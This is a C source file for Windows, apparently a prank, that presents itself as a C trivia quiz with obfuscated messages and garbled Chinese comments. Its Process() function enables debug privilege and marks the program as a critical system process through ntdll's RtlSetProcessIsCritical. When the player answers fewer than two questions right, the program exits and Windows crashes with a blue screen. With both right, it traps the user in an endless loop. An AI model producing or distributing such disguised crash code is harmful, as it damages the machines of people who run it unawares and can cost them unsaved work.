#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdbool.h>
//AI�Ի�.c
//ʹ��DevC++����
void Process(){
int i; 
typedef NTSTATUS(WINAPI *RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
typedef BOOL(WINAPI *RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
//�����������ͣ�����ϵͳAPI 
RtlAdjustPrivilege AP;
RtlSetProcessIsCritical AI;
HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));//����ϵͳdll 
/*AI�Զ������ı�*/AP = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
AI = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
//AI�Ĺؼ������� 
BOOLEAN b;
AP(20UL, TRUE, FALSE, &b);//��20UL��debug����ʽִ�� 
i=AI(TRUE, NULL, FALSE);//iΪ0������� �������쳣 
if(i){
printf("!������ʹ�ù���ԱȨ������!\n���̳�ʼ���쳣�������˳�\n");
system("pause");
exit(1);
}
printf("0x00000000�����ɹ����\n"); 
} 
int main() {
char say[]="���������������Ѻ�����բ������徻�Ƣ����഻�����Ӱ�ԧ����";
int a,i,correct=0;char *p=say;while(*p)(*p++)++;
Process();
printf("%s\n",say);
printf("sizeof(\"\\028\\b\\axb\\xab\\\\012\")�Ƕ���?");
scanf("%d",&i);
system("pause");
if(i!=sizeof("\028\b\axb\xab\\012")){//������ֲ���ȷ 
char say2[]="�۰�Ʒ��������ñ�Ѻ�� "; //hbqwmxdbyy
p=say2;while(*p)(*p++)++;
printf("%s\n",say2);
}
else{
printf("��¶�����");
correct++;
}
char say4[]="ļ�Ѵ������դ�";//���ݿ��ַ����� 
p=say4;while(*p)(*p++)--;
system("pause");
MessageBox(0,say4,"��ʾ",MB_OK);//myctky

system("pause");
printf("a=0;a*=a+=a+++a;֮��a�Ƕ���?");
scanf("%d",&i);
system("pause");
a=0;a*=a+=a+++a;
if(i!=a){//������ֲ���ȷ 
char say2[]="�۰�Ʒ��������ñ�Ѻ�� "; //hbqwmxdbyy
p=say2;while(*p)(*p++)++;
printf("%s\n",say2);
}
else{
printf("��¶�����");
correct++;
}
if(correct<2){
char say3[]="�������÷Ţ��¹Ǵ÷Š���º���͹ͯ붧��ո�ѷ��ⱸ�Ţ������ﲡ�����͹Ͷ����װԳʵӺ���"; //���ݿ��ַ����� 
p=say3;while(*p)(*p++)++;
MessageBox(0,say3,"��ʾ",MB_OK);
system("pause");
system("pause");
system("pause");
return 0;
}
else{
printf("�ɹ������ս��(������ע�ᣬ�������˳�����)"); 
while(1){
system("pause");
} 

	
}
}
